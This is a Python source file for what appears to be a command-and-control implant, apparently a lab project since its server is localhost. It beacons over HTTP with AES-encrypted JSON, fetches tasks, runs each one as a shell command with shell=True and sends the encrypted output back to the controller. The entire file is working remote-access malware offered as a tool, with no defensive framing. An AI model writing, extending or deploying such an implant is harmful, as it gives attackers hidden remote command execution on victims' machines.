import requests
import socket
import time
import subprocess
import json
import os
import sys

# Add utils to path and import AES encryption
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../utils')))
from crypto import aes_encrypt

C2_URL = "http://localhost:8080/beacon"
RESULT_URL = "http://localhost:8080/result"

def beacon_loop():
    hostname = socket.gethostname()

    while True:
        data = {
            "hostname": hostname,
            "payload": "idle"
        }

        try:
            # Encrypt and send beacon
            raw_json = json.dumps(data)
            encrypted = aes_encrypt(raw_json)
            r = requests.post(C2_URL, data=encrypted.encode(), timeout=5)

            if r.status_code == 200:
                response = r.json()
                tasks = response.get("tasks", [])

                for task in tasks:
                    print(f"[+] Executing: {task}")
                    try:
                        output = subprocess.check_output(task, shell=True, stderr=subprocess.STDOUT, timeout=10)
                        result = output.decode().strip()
                    except subprocess.CalledProcessError as e:
                        result = f"[!] Command failed: {e.output.decode().strip()}"

                    print(f"[>] Sending result:\n{result}")

                    result_data = {
                        "hostname": hostname,
                        "command": task,
                        "result": result
                    }
                    encrypted_result = aes_encrypt(json.dumps(result_data))
                    res = requests.post(RESULT_URL, data=encrypted_result.encode())
                    print(f"[<] Server responded: {res.status_code} {res.text}")

        except Exception as e:
            print(f"[!] Beacon failed: {e}")

        time.sleep(10)

if __name__ == "__main__":
    beacon_loop()
